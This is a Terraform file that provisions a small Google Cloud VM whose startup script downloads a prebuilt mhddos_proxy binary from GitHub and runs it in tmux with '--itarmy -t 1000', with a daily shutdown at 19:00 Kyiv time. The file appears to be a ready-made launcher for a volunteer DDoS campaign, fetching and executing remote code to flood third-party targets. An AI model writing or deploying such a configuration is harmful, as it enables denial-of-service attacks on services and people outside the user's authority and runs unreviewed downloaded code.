provider "google" {
}

resource "google_compute_instance" "itarmy" {
  name         = "itarmy2"
  machine_type = "e2-micro"

  boot_disk {
    initialize_params {
      image = "ubuntu-2204-lts"
    }
  }

  network_interface {
  }

  metadata = {
    "startup-script" = <<-EOT
      #!/bin/bash
      apt update
      timedatectl set-timezone Europe/Kiev
      shutdown -P 19:00 --no-wall
      su - ubuntu << EOF
      mkdir -p ~/bin
      wget https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux -O ~/bin/mhddos_proxy_linux && chmod 755 ~/bin/mhddos_proxy_linux
      tmux new -ds mq
      tmux send 'mhddos_proxy_linux --itarmy -t 1000' Enter
      echo -e '"\\e[A": history-search-backward\n"\\e[B": history-search-forward' > .inputrc
      EOF
    EOT
  }
}
